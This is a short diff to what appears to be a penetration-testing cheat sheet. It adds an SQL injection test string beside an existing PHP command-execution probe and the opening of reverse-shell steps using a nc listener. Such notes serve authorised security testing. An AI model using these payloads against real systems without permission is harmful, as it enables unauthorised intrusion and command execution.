@@ -71,6 +71,17 @@ Test for php execution
 <?PHP echo system("whoami");?>
 ```
 
+---
+
+Testing for SQL Injection
+
+```
+test' or 1=1;-- - 
+```
+
+
+---
+
 If it works, obtain a reverse shell
 
 Start a nc listener
